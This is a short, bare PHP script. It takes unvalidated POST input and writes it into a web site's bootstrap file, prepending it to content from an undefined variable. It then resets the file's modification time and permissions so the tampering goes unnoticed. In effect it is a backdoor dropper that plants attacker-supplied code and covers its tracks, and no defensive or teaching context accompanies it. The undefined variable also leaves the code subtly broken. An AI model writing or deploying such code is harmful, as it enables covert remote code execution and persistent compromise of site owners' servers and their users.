<?php
$target = '/srv/site/bootstrap.php';
$before = filemtime($target);
$mode = fileperms($target);
file_put_contents($target, $_POST['body'] . file_get_contents($other));
touch($target, $before);
chmod($target, $mode);
